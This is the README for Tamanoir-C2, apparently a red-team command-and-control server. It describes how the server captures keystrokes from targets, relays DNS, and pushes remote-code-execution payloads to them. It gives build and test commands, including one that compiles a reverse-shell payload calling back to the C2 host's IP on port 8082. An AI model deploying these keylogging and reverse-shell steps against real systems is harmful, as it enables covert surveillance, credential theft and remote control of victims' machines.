# Tamanoir-C2 server

[Back to Readme](../../README.md)

Tamanoir-C2 (Command and Control) server's  purpose is multiple: 
- act as a dns proxy
- extract typed keystrokes from target
- transmit selected RCE( Remote Code Execution) payloads to target



- ⚠ make sure port 53 is available `sudo systemctl stop systemd-resolved` can help


## Architecture
It is composed of 3 servers:
| type | default port | goal|
|----------|----------|----------|
| DNS  | 53 | handle dns requests from targets and rce payloads transmission |
| TCP  | 8082 | handle remote shell sessions |
| GRPC  | 50051 | handle communication with tui clients |



## 🔥 Available Rce payloads
Tamanoir comes with ready-to-use payloads :


| name | description | comments | 
|----------|----------|----------|
| hello |  prints a cute tamanoir to tamanoir stdout  | hello-world payload, demonstrate how a big payload can be transmitted by chunks to target|
| xeyes | open `xeyes` program on target gui | demonstrate how to execute simple shellcode. Only works if target uses x11 |
| reverse-shell | open a tcp-shell communicating with tamanoir-c2 | needs to specify IP var when building (see below) 

#### 📍If using release binaries, make sure to include your `tamanoir-rce-*.bin` in `~/.tamanoir/bins` directory on tamanoir-c2 host
⇨ You'll then be able to select them in tui for transmission to target.<br> 
⇨ You'll have to choose either aarch64 or x86_64 architecture depending on target architecture.


## 🔧 Builder
You also can build provided  payloads from source, and even build your own <br>
Building is mandatory for reverse-shell rce payload, which needs to know your tamanoir-c2 ip @build time

### 📍 payloads location: ./assets/payloads
 
 `tamanoir-c2 rce build`

- will build and strip provided payloads

| name long| name short | description |  default|
|----------|----------|----------|----------|
| --target_arch| -t | x86_64 or aarch64  |  x86_64 |
| --crate_path | -c | path to payload crate (see ./assets/payloads) for examples | - |
| --engine | -e |cross build engine,if needed (docker or podman)  | docker |
| --build-vars | -b | key=value, space-separated env vars required for your payload, if needed  | - | 

- payload output: `~/.tamanoir/bins`
- ⚠ needs [cross](https://github.com/cross-rs/cross) for cross-compilation if target arch != current arch
- ⚠ max payload size (once compiled and stripped) = 4096 bytes

#### example: build reverse-shell 
`tamanoir-c2  rce  build  -c ./assets/payloads/reverse-shell  -b "IP=<tamanoir-c2-ip>" -t x86_64`
will compile `reverse-shell` payload:
- for x86_64 target arch 
- use cross to build it if current arch isn't x86_64
- will establish shell session with \<tamanoir-c2-ip>:8082



## Tester
 `tamanoir-c2 rce test -b <path-to-your-payload-binary>`
- test your payload (locally)
- ⚠ path needs to be absolute

## ⚠ Limitations
- Cross compilation is only available  for `aarch64` ->  `x86_64` 
- Rce payloads are for now only available for GNU toolchain





